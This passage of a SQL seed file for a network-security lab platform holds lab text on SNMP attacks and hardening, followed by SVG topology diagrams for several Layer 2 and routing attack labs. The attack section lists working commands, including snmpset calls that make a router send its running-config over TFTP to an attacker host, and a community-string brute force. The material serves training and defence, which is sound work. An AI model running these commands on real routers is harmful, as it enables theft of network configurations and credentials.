<b>Attack 1 — Config theft via BRIDGE-MIB:</b> <code>snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.4.1.9.9.96</code> reads the running config via SNMP (Cisco-specific OID). <b>Attack 2 — SNMP write (if private is enabled):</b> <code>snmpset -v2c -c private 192.168.1.1 1.3.6.1.4.1.9.9.96.1.1.1.1.2.111 i 1</code> → <code>snmpset -v2c -c private 192.168.1.1 1.3.6.1.4.1.9.9.96.1.1.1.1.3.111 a ''192.168.1.200''</code> → <code>snmpset -v2c -c private 192.168.1.1 1.3.6.1.4.1.9.9.96.1.1.1.1.4.111 s ''copy running-config tftp://192.168.1.200/config.txt''</code>. <b>Attack 3 — Community string brute force:</b> <code>sudo onesixtyone -c /usr/share/wordlists/snmp-strings.txt 192.168.1.1</code>.
<div class="achievement"><span class="medal">📖</span><span class="txt">Achievement: SNMP Hacker</span></div>
', is_pro_only=TRUE
WHERE lab_id=32 AND phase='attack';
UPDATE lab_phases SET title='SNMPv3 and ACL Lockdown', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Authenticate and encrypt SNMP traffic</h3><p>SNMPv3 provides auth (MD5/SHA) and encryption (DES/AES). Disable v2c completely.</p></div>
<div class="stats"><span class="chip xp">✦ 200 XP</span><span class="chip diff">◆ Beginner</span><span class="chip time">◷ ~15 min</span><span class="chip loot">⬡ SNMPv3 · auth · encrypt · ACL</span></div>
<b>Step 1</b> — Remove v2c: <code>no snmp-server community public RO</code> → <code>no snmp-server community private RW</code>. <b>Step 2</b> — SNMPv3: <code>snmp-server group NETBREAKER v3 priv</code> → <code>snmp-server user admin NETBREAKER v3 auth md5 NetBreakerAuth priv des56 NetBreakerEncrypt</code>. <b>Step 3</b> — Test: <code>snmpwalk -v3 -u admin -a MD5 -A ''NetBreakerAuth'' -x DES -X ''NetBreakerEncrypt'' -l authPriv 192.168.1.1 .1</code>. <b>Step 4</b> — ACL restrict: <code>access-list 10 permit 192.168.1.0 0.0.0.255</code> → <code>snmp-server community public RO 10</code>.
<div class="achievement"><span class="medal">🛡️</span><span class="txt">Achievement: SNMP Guardian</span></div>
', is_pro_only=TRUE
WHERE lab_id=32 AND phase='harden';

-- ── lab_topologies: SVGs + legend for all 45 labs ──
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (1, '<svg viewBox="0 0 320 200" xmlns="http://www.w3.org/2000/svg" font-family="ui-monospace, monospace">
  <line x1="90" y1="70" x2="230" y2="70" stroke="#6b7480" stroke-width="3"/>
  <text x="160" y="62" text-anchor="middle" font-size="9" fill="#6b7480">802.1Q TRUNK</text>
  <line x1="70" y1="150" x2="70" y2="92" stroke="#e5484d" stroke-width="2" stroke-dasharray="5 4"/>
  <line x1="250" y1="150" x2="250" y2="92" stroke="#7c3aed" stroke-width="2"/>
  <rect x="30" y="52" width="80" height="36" rx="7" fill="#fff" stroke="#14161a" stroke-width="1.4"/>
  <text x="70" y="74" text-anchor="middle" font-size="12" fill="#14161a" font-weight="600">SW1</text>
  <rect x="210" y="52" width="80" height="36" rx="7" fill="#fff" stroke="#14161a" stroke-width="1.4"/>
  <text x="250" y="74" text-anchor="middle" font-size="12" fill="#14161a" font-weight="600">SW2</text>
  <rect x="28" y="150" width="84" height="34" rx="7" fill="#fff" stroke="#e5484d" stroke-width="1.6"/>
  <text x="70" y="168" text-anchor="middle" font-size="11" fill="#e5484d" font-weight="600">KALI</text>
  <text x="70" y="179" text-anchor="middle" font-size="8" fill="#6b7480">attacker</text>
  <rect x="206" y="150" width="88" height="34" rx="7" fill="#fff" stroke="#7c3aed" stroke-width="1.6"/>
  <text x="250" y="168" text-anchor="middle" font-size="11" fill="#7c3aed" font-weight="600">SRV1 🏆</text>
  <text x="250" y="179" text-anchor="middle" font-size="8" fill="#6b7480">VLAN 20</text>
</svg>', '<svg viewBox="0 0 760 440" xmlns="http://www.w3.org/2000/svg" font-family="ui-monospace, monospace">
  <!-- links -->
  <line x1="380" y1="72" x2="212" y2="168" stroke="#6b7480" stroke-width="2.5"/>
  <text x="300" y="112" text-anchor="middle" font-size="10" fill="#6b7480">trunk</text>
  <line x1="272" y1="196" x2="488" y2="196" stroke="#6b7480" stroke-width="4"/>
  <line x1="118" y1="330" x2="180" y2="222" stroke="#2563eb" stroke-width="2"/>
  <line x1="310" y1="338" x2="238" y2="222" stroke="#e5484d" stroke-width="2.2" stroke-dasharray="6 4"/>
  <line x1="628" y1="330" x2="556" y2="222" stroke="#7c3aed" stroke-width="2"/>

  <!-- trunk label -->
  <rect x="316" y="185" width="128" height="22" rx="11" fill="#fff" stroke="#e6e8ec"/>
  <text x="380" y="200" text-anchor="middle" font-size="10.5" fill="#6b7480">802.1Q TRUNK</text>

  <!-- R1 -->
  <rect x="328" y="28" width="104" height="44" rx="9" fill="#fff" stroke="#14161a" stroke-width="1.5"/>
  <text x="380" y="49" text-anchor="middle" font-size="13" fill="#14161a" font-weight="600">R1</text>
  <text x="380" y="63" text-anchor="middle" font-size="9" fill="#6b7480">router-on-a-stick</text>

  <!-- SW1 -->
  <rect x="140" y="170" width="132" height="52" rx="9" fill="#fff" stroke="#14161a" stroke-width="1.5"/>
  <text x="206" y="193" text-anchor="middle" font-size="13" fill="#14161a" font-weight="600">SW1</text>
  <text x="206" y="210" text-anchor="middle" font-size="9" fill="#6b7480">VLAN 10 · 20 · 99</text>

  <!-- SW2 -->
  <rect x="488" y="170" width="132" height="52" rx="9" fill="#fff" stroke="#14161a" stroke-width="1.5"/>
  <text x="554" y="193" text-anchor="middle" font-size="13" fill="#14161a" font-weight="600">SW2</text>
  <text x="554" y="210" text-anchor="middle" font-size="9" fill="#6b7480">VLAN 10 · 20 · 99</text>

  <!-- PC1 -->
  <rect x="56" y="330" width="118" height="46" rx="9" fill="#fff" stroke="#2563eb" stroke-width="1.6"/>
  <text x="115" y="352" text-anchor="middle" font-size="12" fill="#2563eb" font-weight="600">PC1</text>
  <text x="115" y="367" text-anchor="middle" font-size="8.5" fill="#6b7480">VLAN 10 · 10.0.10.10</text>

  <!-- KALI -->
  <rect x="250" y="338" width="128" height="50" rx="9" fill="#fff" stroke="#e5484d" stroke-width="1.8"/>
  <text x="314" y="360" text-anchor="middle" font-size="12" fill="#e5484d" font-weight="700">KALI · attacker</text>
  <text x="314" y="375" text-anchor="middle" font-size="8.5" fill="#6b7480">Fa0/3 · dynamic-auto ⚠</text>

  <!-- SRV1 -->
  <rect x="560" y="330" width="140" height="48" rx="9" fill="#fff" stroke="#7c3aed" stroke-width="1.8"/>
  <text x="630" y="352" text-anchor="middle" font-size="12" fill="#7c3aed" font-weight="700">SRV1 · 🏆</text>
  <text x="630" y="367" text-anchor="middle" font-size="8.5" fill="#6b7480">VLAN 20 · 10.0.20.10</text>
</svg>', '["VLAN 10 — Users", "VLAN 20 — Servers (target)", "802.1Q Trunk", "Attacker (Kali)"]'::jsonb)
ON CONFLICT (lab_id) DO UPDATE SET svg_small=EXCLUDED.svg_small, svg_large=EXCLUDED.svg_large, legend=EXCLUDED.legend;
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (3, '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 380 220" font-family="ui-monospace,monospace">
  <rect x="130" y="30" width="120" height="44" rx="9" fill="#fff" stroke="#14161a" stroke-width="1.5"/>
  <text x="190" y="54" text-anchor="middle" font-size="14" fill="#14161a" font-weight="600">SW1</text>
  <text x="190" y="68" text-anchor="middle" font-size="9" fill="#6b7480">CAM: running</text>
  <line x1="70" y1="130" x2="150" y2="74" stroke="#6b7480" stroke-width="2"/>
  <line x1="190" y1="74" x2="310" y2="130" stroke="#6b7480" stroke-width="2"/>
  <line x1="190" y1="74" x2="190" y2="160" stroke="#e5484d" stroke-width="2" stroke-dasharray="5 4"/>
  <rect x="12" y="130" width="116" height="40" rx="8" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
  <text x="70" y="152" text-anchor="middle" font-size="12" fill="#2563eb" font-weight="600">PC1</text>
  <text x="70" y="164" text-anchor="middle" font-size="8" fill="#6b7480">10.0.0.10</text>
  <rect x="252" y="130" width="116" height="40" rx="8" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
  <text x="310" y="152" text-anchor="middle" font-size="12" fill="#2563eb" font-weight="600">PC2</text>
  <text x="310" y="164" text-anchor="middle" font-size="8" fill="#6b7480">10.0.0.20</text>
  <rect x="128" y="168" width="124" height="40" rx="8" fill="#fff" stroke="#e5484d" stroke-width="1.5"/>
  <text x="190" y="190" text-anchor="middle" font-size="12" fill="#e5484d" font-weight="600">KALI</text>
  <text x="190" y="202" text-anchor="middle" font-size="8" fill="#6b7480">macof ⚡</text>
</svg>', '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 700 380" font-family="ui-monospace,monospace">
  <rect x="260" y="20" width="180" height="54" rx="10" fill="#fff" stroke="#14161a" stroke-width="2"/>
  <text x="350" y="48" text-anchor="middle" font-size="16" fill="#14161a" font-weight="700">SW1</text>
  <text x="350" y="64" text-anchor="middle" font-size="10" fill="#6b7480">CAM: ${max} / ${max} — FULL</text>
  <line x1="120" y1="210" x2="290" y2="74" stroke="#6b7480" stroke-width="2.5"/>
  <line x1="350" y1="74" x2="580" y2="210" stroke="#6b7480" stroke-width="2.5"/>
  <line x1="350" y1="74" x2="350" y2="280" stroke="#e5484d" stroke-width="2.5" stroke-dasharray="6 5"/>
  <rect x="30" y="210" width="180" height="54" rx="10" fill="#fff" stroke="#2563eb" stroke-width="2"/>
  <text x="120" y="238" text-anchor="middle" font-size="14" fill="#2563eb" font-weight="600">PC1</text>
  <text x="120" y="254" text-anchor="middle" font-size="10" fill="#6b7480">10.0.0.10 · Gi0/1</text>
  <rect x="490" y="210" width="180" height="54" rx="10" fill="#fff" stroke="#2563eb" stroke-width="2"/>
  <text x="580" y="238" text-anchor="middle" font-size="14" fill="#2563eb" font-weight="600">PC2</text>
  <text x="580" y="254" text-anchor="middle" font-size="10" fill="#6b7480">10.0.0.20 · Gi0/2</text>
  <rect x="240" y="280" width="220" height="60" rx="10" fill="#fff" stroke="#e5484d" stroke-width="2"/>
  <text x="350" y="310" text-anchor="middle" font-size="14" fill="#e5484d" font-weight="700">KALI</text>
  <text x="350" y="328" text-anchor="middle" font-size="10" fill="#6b7480">Gi0/3 · macof — 10,000 MACs/sec</text>
  <path d="M350 280 Q90 160 140 220" fill="none" stroke="#e5484d" stroke-width="1.5" stroke-dasharray="4 4" marker-end="url(#nb-arrow)"/>
  <text x="18" y="180" font-size="10" fill="#e5484d">flooded traffic reaches all ports</text>
</svg>', '["Switch with CAM table", "Legitimate host", "Attacker (macof flood)", "Flooded traffic (hub mode)"]'::jsonb)
ON CONFLICT (lab_id) DO UPDATE SET svg_small=EXCLUDED.svg_small, svg_large=EXCLUDED.svg_large, legend=EXCLUDED.legend;
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (8, '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 240" font-family="ui-monospace,monospace">
  <rect x="140" y="14" width="120" height="40" rx="8" fill="#fff" stroke="#14161a" stroke-width="1.5"/>
  <text x="200" y="36" text-anchor="middle" font-size="13" fill="#14161a" font-weight="600">R1 (DHCP)</text>
  <text x="200" y="50" text-anchor="middle" font-size="8" fill="#6b7480">pool: 192.168.1.0/24</text>
  <rect x="140" y="74" width="120" height="38" rx="8" fill="#fff" stroke="#6b7480" stroke-width="1.5"/>
  <text x="200" y="96" text-anchor="middle" font-size="12" fill="#14161a" font-weight="600">SW1</text>
  <line x1="200" y1="54" x2="200" y2="74" stroke="#6b7480" stroke-width="2"/>
  <line x1="60" y1="172" x2="150" y2="112" stroke="#2563eb" stroke-width="2"/>
  <line x1="250" y1="112" x2="340" y2="172" stroke="#e5484d" stroke-width="2" stroke-dasharray="5 4"/>
  <rect x="6" y="172" width="108" height="46" rx="8" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
  <text x="60" y="194" text-anchor="middle" font-size="12" fill="#2563eb" font-weight="600">PC1</text>
  <text x="60" y="210" text-anchor="middle" font-size="8" fill="#6b7480">DHCP client</text>
  <rect x="294" y="172" width="100" height="46" rx="8" fill="#fff" stroke="#e5484d" stroke-width="1.5"/>
  <text x="344" y="194" text-anchor="middle" font-size="12" fill="#e5484d" font-weight="600">KALI</text>
  <text x="344" y="210" text-anchor="middle" font-size="8" fill="#6b7480">yersinia · dhcpd</text>
</svg>', '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 700 380" font-family="ui-monospace,monospace">
  <rect x="250" y="14" width="200" height="50" rx="10" fill="#fff" stroke="#14161a" stroke-width="2"/>
  <text x="350" y="40" text-anchor="middle" font-size="15" fill="#14161a" font-weight="700">R1 · DHCP server</text>
  <text x="350" y="56" text-anchor="middle" font-size="10" fill="#6b7480">pool 192.168.1.0/24</text>
  <rect x="250" y="84" width="200" height="50" rx="10" fill="#fff" stroke="#6b7480" stroke-width="2"/>
  <text x="350" y="110" text-anchor="middle" font-size="14" fill="#14161a" font-weight="700">SW1</text>
  <text x="350" y="126" text-anchor="middle" font-size="10" fill="#6b7480">DHCP snooping: trusted ↑</text>
  <line x1="350" y1="64" x2="350" y2="84" stroke="#6b7480" stroke-width="2.5"/>
  <line x1="110" y1="260" x2="290" y2="134" stroke="#2563eb" stroke-width="2.5"/>
  <line x1="410" y1="134" x2="590" y2="260" stroke="#e5484d" stroke-width="2.5" stroke-dasharray="6 5"/>
  <rect x="20" y="260" width="180" height="60" rx="10" fill="#fff" stroke="#2563eb" stroke-width="2"/>
  <text x="110" y="288" text-anchor="middle" font-size="14" fill="#2563eb" font-weight="600">PC1</text>
  <text x="110" y="306" text-anchor="middle" font-size="10" fill="#6b7480">Gi0/1 · untrusted · rate=5</text>
  <rect x="500" y="260" width="180" height="60" rx="10" fill="#fff" stroke="#e5484d" stroke-width="2"/>
  <text x="590" y="288" text-anchor="middle" font-size="14" fill="#e5484d" font-weight="700">KALI</text>
  <text x="590" y="306" text-anchor="middle" font-size="10" fill="#6b7480">Gi0/3 · untrusted · DHCP OFFER dropped</text>
</svg>', '["DHCP server (trusted)", "Switch with DHCP snooping", "DHCP client", "Attacker (starvation / rogue DHCP)"]'::jsonb)
ON CONFLICT (lab_id) DO UPDATE SET svg_small=EXCLUDED.svg_small, svg_large=EXCLUDED.svg_large, legend=EXCLUDED.legend;
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (11, '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 380 180" font-family="ui-monospace,monospace">
  <rect x="120" y="14" width="140" height="42" rx="8" fill="#fff" stroke="#14161a" stroke-width="1.5"/>
  <text x="190" y="36" text-anchor="middle" font-size="13" fill="#14161a" font-weight="600">R1</text>
  <text x="190" y="50" text-anchor="middle" font-size="9" fill="#6b7480">Telnet:23 · SSH:22</text>
  <rect x="120" y="74" width="140" height="36" rx="8" fill="#fff" stroke="#6b7480" stroke-width="1.5"/>
  <text x="190" y="95" text-anchor="middle" font-size="12" fill="#14161a" font-weight="600">SW1</text>
  <line x1="190" y1="56" x2="190" y2="74" stroke="#6b7480" stroke-width="2"/>
  <line x1="190" y1="110" x2="190" y2="132" stroke="#6b7480" stroke-width="2"/>
  <rect x="100" y="132" width="180" height="40" rx="8" fill="#fff" stroke="#e5484d" stroke-width="1.5"/>
  <text x="190" y="155" text-anchor="middle" font-size="12" fill="#e5484d" font-weight="600">KALI · Wireshark</text>
</svg>', '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 600 300" font-family="ui-monospace,monospace">
  <rect x="200" y="14" width="200" height="54" rx="10" fill="#fff" stroke="#14161a" stroke-width="2"/>
  <text x="300" y="40" text-anchor="middle" font-size="16" fill="#14161a" font-weight="700">R1</text>
  <text x="300" y="56" text-anchor="middle" font-size="11" fill="#6b7480">Telnet 🠕 cleartext · SSH 🠕 encrypted</text>
  <line x1="300" y1="68" x2="300" y2="100" stroke="#6b7480" stroke-width="2"/>
  <rect x="200" y="100" width="200" height="46" rx="10" fill="#fff" stroke="#6b7480" stroke-width="2"/>
  <text x="300" y="126" text-anchor="middle" font-size="14" fill="#14161a" font-weight="600">SW1 (transparent)</text>
  <line x1="300" y1="146" x2="300" y2="188" stroke="#6b7480" stroke-width="2"/>
  <rect x="140" y="188" width="320" height="70" rx="10" fill="#fff" stroke="#e5484d" stroke-width="2"/>
  <text x="300" y="216" text-anchor="middle" font-size="15" fill="#e5484d" font-weight="700">KALI · Wireshark</text>
  <text x="300" y="234" text-anchor="middle" font-size="11" fill="#6b7480">Telnet:  "admin:cisco123" 🠔 cleartext</text>
  <text x="300" y="250" text-anchor="middle" font-size="11" fill="#6b7480">SSH:     "1a3f8c2b...e7d0" 🠔 encrypted</text>
</svg>', '["Router (Telnet + SSH)", "Layer-2 switch", "Attacker (sniffer)", "Cleartext credential ✗"]'::jsonb)
ON CONFLICT (lab_id) DO UPDATE SET svg_small=EXCLUDED.svg_small, svg_large=EXCLUDED.svg_large, legend=EXCLUDED.legend;
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (4, '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 380 220" font-family="ui-monospace,monospace">
  <rect x="10" y="10" width="110" height="38" rx="8" fill="#fff" stroke="#14161a" stroke-width="1.5"/>
  <text x="65" y="33" text-anchor="middle" font-size="12" fill="#14161a" font-weight="600">R1 (backbone)</text>
  <rect x="260" y="10" width="110" height="38" rx="8" fill="#fff" stroke="#14161a" stroke-width="1.5"/>
  <text x="315" y="33" text-anchor="middle" font-size="12" fill="#14161a" font-weight="600">R2</text>
  <rect x="140" y="90" width="110" height="38" rx="8" fill="#fff" stroke="#14161a" stroke-width="1.5"/>
  <text x="195" y="113" text-anchor="middle" font-size="12" fill="#14161a" font-weight="600">R3 (edge)</text>
  <line x1="120" y1="29" x2="260" y2="29" stroke="#6b7480" stroke-width="2"/>
  <line x1="65" y1="48" x2="195" y2="90" stroke="#6b7480" stroke-width="2"/>
  <line x1="315" y1="48" x2="195" y2="90" stroke="#6b7480" stroke-width="2"/>
  <rect x="5" y="160" width="108" height="36" rx="8" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
  <text x="59" y="182" text-anchor="middle" font-size="11" fill="#2563eb" font-weight="600">PC1</text>
  <rect x="260" y="160" width="110" height="36" rx="8" fill="#fff" stroke="#e5484d" stroke-width="1.5"/>
  <text x="315" y="182" text-anchor="middle" font-size="11" fill="#e5484d" font-weight="600">KALI (FRR)</text>
  <line x1="59" y1="180" x2="195" y2="128" stroke="#2563eb" stroke-width="2"/>
  <line x1="260" y1="180" x2="100" y2="40" stroke="#e5484d" stroke-width="2" stroke-dasharray="5 4"/>
</svg>', '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 700 380" font-family="ui-monospace,monospace">
  <rect x="20" y="20" width="180" height="54" rx="10" fill="#fff" stroke="#14161a" stroke-width="2"/>
  <text x="110" y="46" text-anchor="middle" font-size="14" fill="#14161a" font-weight="700">R1 · Area 0</text>
  <text x="110" y="64" text-anchor="middle" font-size="10" fill="#6b7480">router-id 1.1.1.1</text>
  <rect x="500" y="20" width="180" height="54" rx="10" fill="#fff" stroke="#14161a" stroke-width="2"/>
  <text x="590" y="46" text-anchor="middle" font-size="14" fill="#14161a" font-weight="700">R2 · Area 0</text>
  <text x="590" y="64" text-anchor="middle" font-size="10" fill="#6b7480">router-id 2.2.2.2</text>
  <line x1="200" y1="47" x2="500" y2="47" stroke="#6b7480" stroke-width="2.5"/>
  <text x="350" y="42" text-anchor="middle" font-size="10" fill="#6b7480">10.0.0.0/30</text>
  <rect x="230" y="140" width="240" height="54" rx="10" fill="#fff" stroke="#14161a" stroke-width="2"/>
  <text x="350" y="166" text-anchor="middle" font-size="14" fill="#14161a" font-weight="700">R3 · Area 0</text>
  <text x="350" y="184" text-anchor="middle" font-size="10" fill="#6b7480">router-id 3.3.3.3 · Gi0/1 → 192.168.1.0/24</text>
  <line x1="160" y1="74" x2="310" y2="140" stroke="#6b7480" stroke-width="2"/>
  <line x1="540" y1="74" x2="390" y2="140" stroke="#6b7480" stroke-width="2"/>
  <rect x="40" y="260" width="180" height="54" rx="10" fill="#fff" stroke="#2563eb" stroke-width="2"/>
  <text x="130" y="286" text-anchor="middle" font-size="14" fill="#2563eb" font-weight="600">PC1</text>
  <text x="130" y="304" text-anchor="middle" font-size="10" fill="#6b7480">192.168.1.100</text>
  <rect x="460" y="260" width="220" height="60" rx="10" fill="#fff" stroke="#e5484d" stroke-width="2"/>
  <text x="570" y="286" text-anchor="middle" font-size="14" fill="#e5484d" font-weight="700">KALI (FRR)</text>
  <text x="570" y="304" text-anchor="middle" font-size="10" fill="#6b7480">OSPF neighbor · injecting fake routes</text>
  <line x1="130" y1="260" x2="310" y2="194" stroke="#2563eb" stroke-width="2"/>
  <line x1="460" y1="290" x2="155" y2="60" stroke="#e5484d" stroke-width="2" stroke-dasharray="6 5"/>
</svg>', '["OSPF backbone router", "OSPF router", "Edge router", "End host", "Attacker (rogue OSPF)"]'::jsonb)
ON CONFLICT (lab_id) DO UPDATE SET svg_small=EXCLUDED.svg_small, svg_large=EXCLUDED.svg_large, legend=EXCLUDED.legend;
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (5, '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 220" font-family="ui-monospace,monospace">
  <rect x="10" y="10" width="120" height="42" rx="8" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
  <text x="70" y="32" text-anchor="middle" font-size="12" fill="#2563eb" font-weight="600">R1 · ACTIVE</text>
  <text x="70" y="46" text-anchor="middle" font-size="8" fill="#6b7480">prio 150 · vip .254</text>
  <rect x="270" y="10" width="120" height="42" rx="8" fill="#fff" stroke="#6b7480" stroke-width="1.5"/>
  <text x="330" y="32" text-anchor="middle" font-size="12" fill="#6b7480" font-weight="600">R2 · STANDBY</text>
  <text x="330" y="46" text-anchor="middle" font-size="8" fill="#6b7480">prio 100</text>
  <rect x="120" y="90" width="160" height="36" rx="8" fill="#fff" stroke="#6b7480" stroke-width="1.5"/>
  <text x="200" y="112" text-anchor="middle" font-size="12" fill="#14161a" font-weight="600">SW1</text>
  <line x1="130" y1="52" x2="160" y2="90" stroke="#6b7480" stroke-width="2"/>
  <line x1="270" y1="52" x2="240" y2="90" stroke="#6b7480" stroke-width="2"/>
  <rect x="10" y="166" width="110" height="40" rx="8" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
  <text x="65" y="188" text-anchor="middle" font-size="12" fill="#2563eb" font-weight="600">PC1</text>
  <text x="65" y="202" text-anchor="middle" font-size="8" fill="#6b7480">gw: 192.168.1.254</text>
  <rect x="270" y="166" width="120" height="40" rx="8" fill="#fff" stroke="#e5484d" stroke-width="1.5"/>
  <text x="330" y="188" text-anchor="middle" font-size="12" fill="#e5484d" font-weight="600">KALI</text>
  <text x="330" y="202" text-anchor="middle" font-size="8" fill="#6b7480">yersinia HSRP</text>
  <line x1="65" y1="166" x2="160" y2="126" stroke="#2563eb" stroke-width="2"/>
  <line x1="330" y1="166" x2="240" y2="126" stroke="#e5484d" stroke-width="2" stroke-dasharray="5 4"/>
</svg>', '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 700 380" font-family="ui-monospace,monospace">
  <rect x="50" y="20" width="180" height="54" rx="10" fill="#fff" stroke="#2563eb" stroke-width="2"/>
  <text x="140" y="44" text-anchor="middle" font-size="14" fill="#2563eb" font-weight="700">R1 · HSRP Active</text>
  <text x="140" y="64" text-anchor="middle" font-size="10" fill="#6b7480">priority 150 · VIP 192.168.1.254</text>
  <rect x="470" y="20" width="180" height="54" rx="10" fill="#fff" stroke="#6b7480" stroke-width="2"/>
  <text x="560" y="44" text-anchor="middle" font-size="14" fill="#6b7480" font-weight="700">R2 · HSRP Standby</text>
  <text x="560" y="64" text-anchor="middle" font-size="10" fill="#6b7480">priority 100</text>
  <line x1="230" y1="47" x2="470" y2="47" stroke="#6b7480" stroke-width="2.5"/>
  <rect x="220" y="130" width="260" height="46" rx="10" fill="#fff" stroke="#6b7480" stroke-width="2"/>
  <text x="350" y="156" text-anchor="middle" font-size="14" fill="#14161a" font-weight="600">SW1 (transparent)</text>
  <line x1="180" y1="74" x2="280" y2="130" stroke="#6b7480" stroke-width="2"/>
  <line x1="520" y1="74" x2="420" y2="130" stroke="#6b7480" stroke-width="2"/>
  <rect x="50" y="250" width="180" height="54" rx="10" fill="#fff" stroke="#2563eb" stroke-width="2"/>
  <text x="140" y="276" text-anchor="middle" font-size="14" fill="#2563eb" font-weight="600">PC1</text>
  <text x="140" y="294" text-anchor="middle" font-size="10" fill="#6b7480">192.168.1.100 · gw = VIP → ?</text>
  <rect x="470" y="250" width="180" height="60" rx="10" fill="#fff" stroke="#e5484d" stroke-width="2"/>
  <text x="560" y="276" text-anchor="middle" font-size="14" fill="#e5484d" font-weight="700">KALI</text>
  <text x="560" y="294" text-anchor="middle" font-size="10" fill="#6b7480">forged HSRP Hello · priority 255</text>
  <line x1="140" y1="250" x2="300" y2="176" stroke="#2563eb" stroke-width="2"/>
  <line x1="470" y1="280" x2="100" y2="60" stroke="#e5484d" stroke-width="2" stroke-dasharray="6 5"/>
</svg>', '["HSRP Active router", "HSRP Standby router", "Layer-2 switch", "Host (gateway = virtual IP)", "Attacker (HSRP hijack)"]'::jsonb)
ON CONFLICT (lab_id) DO UPDATE SET svg_small=EXCLUDED.svg_small, svg_large=EXCLUDED.svg_large, legend=EXCLUDED.legend;
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (7, '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 380 180" font-family="ui-monospace,monospace">
  <rect x="10" y="10" width="110" height="40" rx="8" fill="#fff" stroke="#14161a" stroke-width="1.5"/>
  <text x="65" y="33" text-anchor="middle" font-size="12" fill="#14161a" font-weight="600">R1</text>
  <text x="65" y="46" text-anchor="middle" font-size="8" fill="#e5484d">CDP✗ LLDP✗</text>
  <rect x="140" y="80" width="100" height="34" rx="8" fill="#fff" stroke="#6b7480" stroke-width="1.5"/>
  <text x="190" y="100" text-anchor="middle" font-size="11" fill="#14161a" font-weight="600">SW1</text>
  <line x1="65" y1="50" x2="150" y2="80" stroke="#6b7480" stroke-width="2"/>
  <rect x="260" y="10" width="110" height="40" rx="8" fill="#fff" stroke="#e5484d" stroke-width="1.5"/>
  <text x="315" y="33" text-anchor="middle" font-size="12" fill="#e5484d" font-weight="600">KALI</text>
  <text x="315" y="46" text-anchor="middle" font-size="8" fill="#6b7480">tcpdump CDP</text>
  <line x1="240" y1="97" x2="260" y2="30" stroke="#e5484d" stroke-width="2" stroke-dasharray="5 4"/>
</svg>', '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 600 280" font-family="ui-monospace,monospace">
  <rect x="40" y="20" width="180" height="54" rx="10" fill="#fff" stroke="#14161a" stroke-width="2"/>
  <text x="130" y="46" text-anchor="middle" font-size="14" fill="#14161a" font-weight="700">R1</text>
  <text x="130" y="64" text-anchor="middle" font-size="10" fill="#6b7480">CDP: enabled · LLDP: enabled</text>
  <rect x="190" y="120" width="220" height="46" rx="10" fill="#fff" stroke="#6b7480" stroke-width="2"/>
  <text x="300" y="144" text-anchor="middle" font-size="14" fill="#14161a" font-weight="600">SW1</text>
  <text x="300" y="160" text-anchor="middle" font-size="10" fill="#6b7480">Trunk to R1 · Access to KALI</text>
  <line x1="170" y1="74" x2="250" y2="120" stroke="#6b7480" stroke-width="2.5"/>
  <rect x="380" y="20" width="200" height="60" rx="10" fill="#fff" stroke="#e5484d" stroke-width="2"/>
  <text x="480" y="46" text-anchor="middle" font-size="14" fill="#e5484d" font-weight="700">KALI</text>
  <text x="480" y="64" text-anchor="middle" font-size="10" fill="#6b7480">CDP: IOSvL2, vlan 1, VTP lab.local</text>
  <line x1="410" y1="143" x2="380" y2="50" stroke="#e5484d" stroke-width="2.5" stroke-dasharray="6 5"/>
  <text x="420" y="130" font-size="10" fill="#e5484d">CDP multicast every 60s</text>
</svg>', '["Router (CDP/LLDP active)", "Layer-2 switch", "Attacker (sniffing CDP/LLDP)", "Leaked discovery info"]'::jsonb)
ON CONFLICT (lab_id) DO UPDATE SET svg_small=EXCLUDED.svg_small, svg_large=EXCLUDED.svg_large, legend=EXCLUDED.legend;
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (6, '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 380 200" font-family="ui-monospace,monospace">
  <rect x="130" y="10" width="120" height="40" rx="8" fill="#fff" stroke="#14161a" stroke-width="1.5"/>
  <text x="190" y="33" text-anchor="middle" font-size="13" fill="#14161a" font-weight="600">R1 (ACL)</text>
  <line x1="60" y1="90" x2="160" y2="50" stroke="#2563eb" stroke-width="2"/>
  <line x1="220" y1="50" x2="320" y2="90" stroke="#6b7480" stroke-width="2"/>
  <line x1="280" y1="50" x2="320" y2="90" stroke="#e5484d" stroke-width="2" stroke-dasharray="5 4"/>
  <rect x="6" y="90" width="110" height="40" rx="8" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
  <text x="61" y="113" text-anchor="middle" font-size="12" fill="#2563eb" font-weight="600">PC1 ✅</text>
  <rect x="130" y="90" width="120" height="40" rx="8" fill="#fff" stroke="#e5484d" stroke-width="1.5"/>
  <text x="190" y="113" text-anchor="middle" font-size="12" fill="#e5484d" font-weight="600">KALI ❌</text>
  <rect x="264" y="90" width="110" height="40" rx="8" fill="#fff" stroke="#6b7480" stroke-width="1.5"/>
  <text x="319" y="113" text-anchor="middle" font-size="12" fill="#6b7480" font-weight="600">PC2 (server)</text>
